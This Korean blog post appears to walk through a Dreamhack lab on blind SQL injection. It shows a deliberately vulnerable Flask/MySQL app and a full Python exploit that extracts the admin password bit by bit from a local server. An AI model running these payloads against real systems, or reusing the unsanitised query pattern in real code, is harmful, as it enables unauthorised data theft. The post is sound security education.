---
title: Dreamhack Exercise Blind SQL Injection Advanced
date: 2022-02-25 15:39:10
tags: Dreamhack
categories: Dreamhack
---

## Summary
Blind SQL Injection 은 실행된 SQL 쿼리의 결과 중 참과 거짓의 유무만 판단할 수 있을 때 사용할 수 있는 공격 기법입니다

이번 코스에서는 SQL Injection 이 발생하지만 출력되는 결과를 통해 쿼리 실행의 참과 거짓만을 유추할 수 있을 때 이를 공격하여 데이터베이스의 내용을 추출하는 실습을 하겠습니다

## 문제의 배경 설명
문제 코드를 살펴보기에 앞서 문제 지문을 보면 관리자의 비밀번호는 아스키코드와 한글로 구성되어 있습니다 라는 설명이 존재합니다

이 말은 Blind SQL Injection 공격을 진행할 때 데이터가 반드시 아스키 범위로 구성되었을 것이라는 고정 관념을 가지지 말아야 함을 의미합니다

실제로 워게임이 아닌 현실에서 사용하는 데이터베이스에서는 대상 사이트 및 언어 셋에 따라 영어 이외에도 한국어 , 중국어 , 일본어 등 다양한 언어로 구성되어 있을 확률이 높습니다

이러한 상황에서 아스키 코드 범위로만 Blind SQL Injection 을 진행한다면 올바르지 않은 형태로 데이터가 추출되리 가능성이 매우 높습니다

이 문제의 경우에도 utf-8 언어셋에서 한글은 11,172 개의 경우의 수가 존재하기 때문에 이를 순차적으로 증가하면서 브루트 포싱하는 것은 굉장히 비효율적입니다

브루트 포싱을 과도하게 진행할 경우 추출 시간이 오래 소요되는 것은 물론이고 방화벽 및 관제 등에 의해 탐지될 가능성이 매우 높아집니다

따라서 이번 실습에서는 비트 연산을 이용한 공격을 활용해 훨씬 효율적으로 공격하는 방법에 대해 실습할 예정입니다

## 분석
간단히 예제를 분석해보겠습니다

### 데이터베이스 초기값
Figure2 는 데이터베이스 초기 SQL 을 구성하는 init.sql 의 내용입니다

user_db 데이터베이스를 utf-8 언어 셋으로 생성하며 uid 와 upw 컬럼을 갖는 users 테이블을 생성합니다

users 테이블에는 초기 세 개의 row 를 초기화해두는데 이 때 admin 계정의 패스워드가 플래그임을 알 수 있습니다 물론 패스워드는 한글과 아스키코드의 조합으로 이루어져 있을 것입니다

Figure2 데이터베이스 초기값

```SQL
CREATE DATABASE user_db CHARACTER SET utf8;
GRANT ALL PRIVILEGES ON user_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';
USE `user_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);
INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');
INSERT INTO users (uid, upw) values ('guest', 'guest');
INSERT INTO users (uid, upw) values ('test', 'test');
FLUSH PRIVILEGES;
```

### 코드 분석
Figure1 은 문제에서 제공된 소스코드 중 app.py 의 내용입니다
Flask 와 mysql 을 이용한 서버가 동작하고 있으며

/ 경로에 GET 메소드로 uid 파라미터를 통해 이용자 입력을 전달받습니다
전달받은 입력으 별도의 여과 없이 바로 mysql 쿼리에 사용되기 때문에 SQL Injection 취약점이 발생합니다

다만 쿼리 실행의 결과를 그대로 출력해주지 않고 쿼리 성공의 여부만 알 수 있기 때문에 Blind SQL Injection 을 이용해 공격해야 합니다

Figure1 app.py

```python
import os
from flask import Flask, request, render_template_string
from flask_mysqldb import MySQL
app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)
template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''
@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0
    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")
    return render_template_string(template, uid=uid, nrows=nrows)
if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

## SQL Injection 테스트
입력 값에 대한 어떠한 검사도 없이 where 절에 삽입되기 때문에 ' 문자를 넣어 SQL Injection 공격을 수행할 수 있습니다

' or 1=1 limit 0,1-- - 과 ' or 1=2 limit 0,1-- - 구문을 통해 참과 거짓을 구분할 수 있음을 확인할 수 있습니다

여기서 limit 0,1 을 수행해줘야 하는 이유는 다음과 같이 템플릿에서 row 가 1개여야 하는 조건을 만족해야 결과값을 출력하기 때문입니다

```
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
```

limit 을 통해 row 의 갯수를 지정하지 않을 경우 세 개의 row 가 반환되어 참 / 거짓을 구분할 수 있는 문장을 확인할 수 없습니다

## 익스플로잇
이제 admin 계정의 패스워드를 추출하기 위한 익스플로잇을 설계해 보겠습니다

### admin 패스워드 길이 찾기
먼저 Blind SQL Injection 을 진행하기 위해 admin 패스워드의 길이를 알아내야 합니다

### 각 문자 별 비트열 길이 찾기
패스워드의 각 문자가 한글인지 아스키코드인지 알 수 없기 때문에 이를 판단하기 위해서 각 문자를 비트열로 표현했을 때의 길이를 알아내야 합니다

### 각 문자 별 비트열 추출
패스워드 별 각 문자에 해당하는 비트열을 추출합니다
이때 아스키코드의 경우 최대 8번 한글의 경우 최대 24번의 요청으로 추출할 수 있습니다

### 비트열을 문자로 변환
추출할 비트열을 문자로 변환합니다
이 때 각 문자의 인코딩 utf-8 이였음을 감안해 변환해야 합니다

## admin 패스워드 길이 찾기
MySQL 에서 데이터의 길이를 알아내기 위해 length 함수를 사용합니다
length 함수는 문자열을 bytes 형태로 표현하였을 때의 길이를 반환하는 함수입니다

즉 인코딩에 관계없이 전체 문자열을 표현하는데에 사요되는 바이트의 수를 반환하기 때문에 만약 아스키코드로 문자열이 구성되어 있지 않다면 올바르지 않은 값을 반환할 수 있습니다

따라서 문자열 인코딩에 따른 정확한 길이를 계산하기 위해서는 char_length 함수를 사용해야 합니다

admin 패스워드의 길이를 찾기 위해 다음과 같은 형태로 쿼리를 작성할 수 있습니다
admin' and length(upw) = {length}-- -

Figure3 Find admin password length

```python
from requests import get
host = "http://localhost:5000"
password_length = 0
while True:
    password_length += 1
    query = f"admin' and char_length(upw) = {password_length}-- -"
    r = get(f"{host}/?uid={query}")
    if "exists" in r.text:
        break
print(f"password length: {password_length}")
```

## 각 문자 별 비트열 길이 찾기
패스워드의 각 문자가 한글인지 아스키코드인지 알 수 없기 때문에 비트열로 변환하여 추출하기 전에 각 비트열의 길이를 찾아야 합니다

admin 패스워드의 길이를 찾을 때와 동일한 방식으로 찾을 수 있으며 비트열을 모두 0 과 1 로 이루어져 있기 때문에 일반적인 length 함수를 사용하여도 무방합니다

각 문자 별 비트열 길이를 찾기 위해 다음과 같은 형태로 쿼리를 작성할 수 있습니다
admin' and length(bin(ord(substr(upw,{i},1)))) = {bit_length}-- -

Figure4 Find each characters bitstream length

```python
for i in range(1, password_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            break
    print(f"character {i}'s bit length: {bit_length}")
```

## 각 문자 별 비트열 추출
각 문자 별 비트열의 길이를 구했다면 다음으로 각 문자 별 비트열을 모두 추출해야 합니다

비트열의 길이를 구할 때와 비슷한 방식으로 쿼리를 작성할 수 있습니다
admin' and substr(bin(ord(substr(upw,{i},1)))), {j},1 = '1'-- -

Figure5 Find each characters bitstream

```python
bits = ""
for j in range(1, bit_length + 1):
    query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- -"
    r = get(f"{host}/?uid={query}")
    if "exists" in r.text:
        bits += "1"
    else:
        bits += "0"
print(f"character {i}'s bits: {bits}")
```

## 비트열을 문자로 변환
패스워드의 각 비트열을 모두 추출했다면 이를 다시 문자로 변환해주어야 합니다

이 때 한글과 같이 아스키 코드 범위가 아닌 문자의 경우 인코딩에 유의하여 변환해주어야 합니다

예를들어 가 의 경우 utf-8 로 인코딩하였을 때 \xea\xb0\x80 로 표현됩니다

이를 비트열로 표현하면 111010101011000010000000 가 됩니다
비트열을 다시 문자로 변환하기 위해서는 다음과 같은 순서로 진행해야 합니다

1. 비트열을 정수로 변환
2. 정수를 Big Endian 형태의 문자로 변환
3. 변환된 문자를 인코딩에 맞게 변환

비트열을 정수로 변환하기 위해 int 클래스를 사용할 수 있고 정수를 Big Endian 형태로 변환하기 위해 int.to_bytes 함수를 사용할 수 있습니다
마지막으로 문자를 인코딩에 맞게 변환하기 위해 bytes.decode 함수를 사용할 수 있습니다

Figure6 Bitstream to character

```python
password = ""
for i in range(1, password_length + 1):
    ...
    password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")
```

## 최종 익스플로잇
Figure7 Final Exploit

```python
Figure 7. Final Exploit

from requests import get
host = "http://localhost:5000"
password_length = 0
while True:
    password_length += 1
    query = f"admin' and char_length(upw) = {password_length}-- -"
    r = get(f"{host}/?uid={query}")
    if "exists" in r.text:
        break
print(f"password length: {password_length}")
password = ""
for i in range(1, password_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            break
    print(f"character {i}'s bit length: {bit_length}")
    
    bits = ""
    for j in range(1, bit_length + 1):
        query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            bits += "1"
        else:
            bits += "0"
    print(f"character {i}'s bits: {bits}")
    password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")
print(password)
```

* * * 

## Reference
Reference : https://dreamhack.io